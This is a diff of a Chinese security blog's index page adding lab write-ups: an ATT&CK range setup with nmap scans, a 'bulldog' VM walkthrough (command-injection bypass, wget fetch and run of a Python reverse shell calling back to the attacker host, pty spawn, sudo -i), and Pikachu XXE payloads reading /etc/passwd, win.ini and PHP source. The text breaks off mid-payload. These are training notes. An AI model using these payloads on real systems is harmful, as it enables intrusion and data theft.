@@ -12,12 +12,12 @@
 
 <link rel="stylesheet" href="/css/main.css">
 
-<link rel="stylesheet" href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
 <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta name="description" content="Try &amp; Enjoy">
@@ -117,24 +117,9 @@
     <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">32</span></a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>
-
-  </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">13</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
   </ul>
@@ -164,10 +149,227 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/14/PenetrationRange/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/14/PenetrationRange/" class="post-title-link" itemprop="url">ATK&CK实战靶场搭建及攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-14 20:00:13 / 修改时间：21:40:58" itemprop="dateCreated datePublished" datetime="2021-05-14T20:00:13+08:00">2021-05-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h1><p>说实话对于搭建window内外网IP之前没试过，觉得也很简单，结果把内网网络适配器和外网的网络适配器搞反了，导致时间耗费较高，特此记录。其他的博客大抵都跳过了此步骤。</p>
+<p>下载靶场环境：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<p>大家的模拟攻击示意图很清楚，在此借鉴一下：</p>
+<p><img src="/2021/05/14/PenetrationRange/4.png"></p>
+<p>靶机环境拓扑图如下：<br><img src="/2021/05/14/PenetrationRange/2.png"></p>
+<p>配置网络：</p>
+<p>分别给web服务器配置NAT模式的网卡一个作为外网，VMnet2的网卡一个作为内网。其余域控和域成员分配一个VMnet2即可。在vmware的虚拟网络配置器里面需要添加VMnet2，且设置NAT模式取消DHCP自动分配IP选项。</p>
+<p>win7开机后，需要设置本地连接6的IPV4如下图所示：</p>
+<p>控制面板 - 网络和Internet - 网络和共享中心 - 更改适配器设置 - 右键本地连接6 - 双击IPv4，其中<strong>114.114.114.114</strong>是国内三大运营商的通用DNS，是国内用户上网常用的DNS</p>
+<p><strong>8.8.8.8</strong>和<strong>8.8</strong>.<strong>4.4</strong> 是Google提供的免费DNS服务器的IP，更适合国外以及访问国外网站的用户使用</p>
+<p><img src="/2021/05/14/PenetrationRange/3.png"></p>
+<p>参考下图:<br><img src="/2021/05/14/PenetrationRange/1.png"></p>
+<p>开启win7的phpstudy,同时测试win7是否可以pingkali和内网的两台主机。ping通over，环境搭建到此结束。</p>
+<h1 id="2-攻击流程"><a href="#2-攻击流程" class="headerlink" title="2. 攻击流程"></a>2. 攻击流程</h1><h2 id="0x01-主机发现："><a href="#0x01-主机发现：" class="headerlink" title="0x01 主机发现："></a>0x01 主机发现：</h2><p>DMZ区也就是处于两个防火墙之间的，一个合格的DMZ区是为了提供外部主机访问内网资源服务器的一个缓冲区域，应该有着严格的内外网隔离，本次靶场只是一个模拟，dmz区并没有很合规。</p>
+<p>那么入手以后，先进行信息收集，桥接嘛，那么直接扫一下桥接网段的存活主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.140.0/24</span><br><span class="line"></span><br><span class="line">netdiscover -i eth0 -r 192.168.140.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/14/PenetrationRange/5.png"></p>
+<p>获得目标IP，开始扫描端口：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -vv提高输出信息的详细度</span></span><br><span class="line">nmap -sV -vv -p 1-65535 192.168.140.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/14/PenetrationRange/6.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/7.png"></p>
+<p>80端口是一个phpstudy探针：</p>
+<p><img src="/2021/05/14/PenetrationRange/8.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/05/bulldog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/05/bulldog/" class="post-title-link" itemprop="url">渗透测试之bulldog</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-05 20:44:04" itemprop="dateCreated datePublished" datetime="2021-05-05T20:44:04+08:00">2021-05-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-06 17:07:00" itemprop="dateModified" datetime="2021-05-06T17:07:00+08:00">2021-05-06</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日突然冒出渗透靶机的想法，突然一看，前人早已栽好了树。</p>
+<p>每日分享：原来在孩提时期就已经看过余华的活着，只是当时读懂活着的人不是我。</p>
+<p>小狗拼命的想叫醒他的同伴，可他还不知道同伴可能再也醒不过来了</p>
+<p>每天都有人跟你一样在注视着生活中的点滴</p>
+<p>最后献上红楼的一句箴言：假亦真时真亦假，无为有处有还无</p>
+<p>不知道既喜欢红楼又喜欢昆曲，把后半辈子都献给教授外国人红楼梦的他，心境又是如何呢</p>
+<p>人生本来就是尝试的过程，正确与否在你以为</p>
+<p>也罢，继续写博客辽</p>
+<h1 id="0x01-资产收集"><a href="#0x01-资产收集" class="headerlink" title="0x01 资产收集"></a>0x01 资产收集</h1><p>靶机：Ubuntu16.04：192.168.127.134</p>
+<p>攻击机：kali 2021.1：192.168.127.133</p>
+<p>愣是想不起来这个命令叫啥：lsb_release -a</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 主机发现</span></span><br><span class="line"><span class="comment"># ping scan</span></span><br><span class="line">nmap -sn 192.168.127.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line">masscan --rate=10000 --ports 0-65535 192.168.127.134</span><br><span class="line"></span><br><span class="line"><span class="comment"># 探究端口服务</span></span><br><span class="line">nmap -sV -T4 -O -p 23,80,8080 192.168.127.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/05/bulldog/1.png"></p>
+<p>可以看到python版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描子域名</span></span><br><span class="line">dirb http://192.168.127.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/05/bulldog/2.png"></p>
+<p>去康康admin和dev分别是什么服务。访问admin会看到无验证码的登陆界面，而dev必须登陆之后才可以看到。</p>
+<p>dev页面有多个邮箱，去康康dev的源码，可能会md5加密的密码存储，一看还真有。解密之后尝试登陆admin页面，发现后两个账号可以登陆进去。不过账号是邮箱的前面，也就是姓名，登陆进去之后，发现dev界面的web shell也有了权限。其实这个界面类似于拿到一台被限制命令白名单的机子。尝试绕过吧。</p>
+<p><img src="/2021/05/05/bulldog/4.png"></p>
+<h1 id="0x02-漏洞检测"><a href="#0x02-漏洞检测" class="headerlink" title="0x02 漏洞检测"></a>0x02 漏洞检测</h1><p><strong>远程命令执行漏洞检测</strong>：</p>
+<p>使用;同时执行多个命令，被过滤；</p>
+<p>使用**&amp;,&amp;&amp;,|**同时执行多个命令,成功。</p>
+<p>查看敏感目录，发现3个用户：<br><img src="/2021/05/05/bulldog/3.png"></p>
+<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>试试反弹shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在kali的/var/html/www目录下，搭建web服务</span></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击机监听1234端口</span></span><br><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行wget命令尝试连接</span></span><br><span class="line">pwd &amp; wget http://192.168.127.133</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机下载shell文件</span></span><br><span class="line">ls &amp; wget http://192.168.56.133/shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行shell</span></span><br><span class="line">ls &amp; python shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机删除shell</span></span><br><span class="line">ls &amp; rm -rf shell.py</span><br></pre></td></tr></table></figure>
+
+<p>其中反弹shell脚本shell.py内容如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># create an INET, STREAMing socket</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># now connect to the web server on port 1234</span></span><br><span class="line">s.connect((<span class="string">&quot;192.168.127.133&quot;</span>, <span class="number">1234</span>))</span><br><span class="line">os.dup(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/05/05/bulldog/5.png"></p>
+<p>进入home，查看其他用户:bulldogadmin  django</p>
+<p>进入bulldogadmin，查看所有文件，此时还是ls -la找到隐藏目录.hiddenadmindirectory。找到可执行文件customPermissionApp。<strong>strings</strong>查看其中字符</p>
+<p><img src="/2021/05/05/bulldog/6.png"></p>
+<p>猜测密码SUPERultimatePASSWORDyouCANTget。不过此处H到底代表什么暂时还不清楚。</p>
+<h1 id="0x04-提权-后门维持"><a href="#0x04-提权-后门维持" class="headerlink" title="0x04  提权/后门维持"></a>0x04  提权/后门维持</h1><p>此时无法提权，需要打开新终端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开新终端</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05  总结"></a>0x05  总结</h1><ol>
+<li><p>习惯查看网页源码以及查看bash下所有文件<strong>ls -la</strong></p>
+</li>
+<li><p>&amp;&amp;   &amp;    |的妙用</p>
+</li>
+<li><p>当cat查看某些文件出现乱码时，可以考虑用strings</p>
+</li>
+<li><p>一般反弹的shell不如终端，一般拿到后都先用python弹一个终端出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&quot;</span>/bin/bash<span class="string">&quot;)&quot;</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure></li>
+<li><p>反弹shell过程</p>
+</li>
+<li><p>知识点总结：</p>
+<ul>
+<li><p>Python -m ：mod,run library module  as  a   script</p>
+</li>
+<li><p>SimpleHTTPServe：use Python SimpleHTTPServer to turn any directory into a simple HTTP web server.</p>
+</li>
+<li><p>python http服务器运行在80端口</p>
+</li>
+<li><p>nmap -sn：ping scan</p>
+</li>
+<li><p>masscan –rate=10000 –ports 0-65535 192.168.127.134：</p>
+<p>–rate=10000  意思是10kpps(packet per second)，每秒一万个数据包</p>
+</li>
+<li><p>wget：非交互式网络文件下载工具</p>
+</li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/29/%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E8%AE%B2%E5%BA%A7%E6%9C%89%E6%84%9F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="swanQ">
       <meta itemprop="description" content="Try & Enjoy">
     </span>
@@ -270,7 +472,7 @@
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/28/pikachu/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="swanQ">
       <meta itemprop="description" content="Try & Enjoy">
     </span>
@@ -298,7 +500,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-03 21:14:15" itemprop="dateModified" datetime="2021-05-03T21:14:15+08:00">2021-05-03</time>
+                <time title="修改时间：2021-05-04 11:34:00" itemprop="dateModified" datetime="2021-05-04T11:34:00+08:00">2021-05-04</time>
               </span>
 
           
@@ -525,6 +727,67 @@
 <li><p>探测内网其他主机的端口</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;http:&#x2F;&#x2F;192.168.10.100:22</span><br></pre></td></tr></table></figure></li>
 </ol>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE ：xml external entity injection，xml外部实体注入漏洞<br>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,即<strong>服务端接收和解析了来自用户端的xml数据</strong>,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>目前多种语言解析xml的函数默认禁止解析外部实体内容的,从而直接避免这个漏洞。</p>
+<p>第一部分：XML声明部分</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>第二部分：文档类型定义 DTD</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">entity-name</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;URI/URL&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>第三部分：文档元素</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。</p>
+<p>① 内部申明DTD格式<!DOCTYPE 根元素 [元素申明]></p>
+<p>② 外部引用DTD格式<!DOCTYPE 根元素 SYSTEM "外部DTD的URI"></p>
+<p>③ 引用公共DTD格式<!DOCTYPE 根元素 PUBLIC "DTD标识名" "公共DTD的URI"></p>
+<ul>
+<li>本地实体类型举例：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;  encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [           &#x2F;&#x2F;定义了foo的根元素</span><br><span class="line">&lt;!ELEMENT foo ANY&gt;        &#x2F;&#x2F;foo是接受任何参数的</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot;&gt;]&gt;    &#x2F;&#x2F;定义了一个实体 xxe，内容为test</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">	&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;    &#x2F;&#x2F;&amp;xxe进行引用 本地引用</span><br><span class="line">	&lt;pass&gt;pass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>外部实体引用举例：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;&#x2F;x&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查看后端源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$xml</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>];</span><br><span class="line">    <span class="comment">//$xml = $test;</span></span><br><span class="line">    <span class="comment">//考虑到目前很多版本里Libxml都&gt;=2.9.0,所以此处添加LIBXML_NOENT参数开启外部实体解析</span></span><br><span class="line">    <span class="variable">$data</span> = @simplexml_load_string(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//正常xml数据测试,此处的回显并不能证明支持外部实体，需要进一步测试</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-string">&quot;swanQ&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//服务器为windows系统，用此payload来测试是否有xxe漏洞。</span><br><span class="line">//查看服务器的内容</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C://Windows//win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//用php://filter获取php源代码</span><br><span class="line">//使用php伪协议，打印base64编码后的xxe.php</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [ <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//爆破开放端口</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">noet</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:80&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//Linux下读取文件</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span 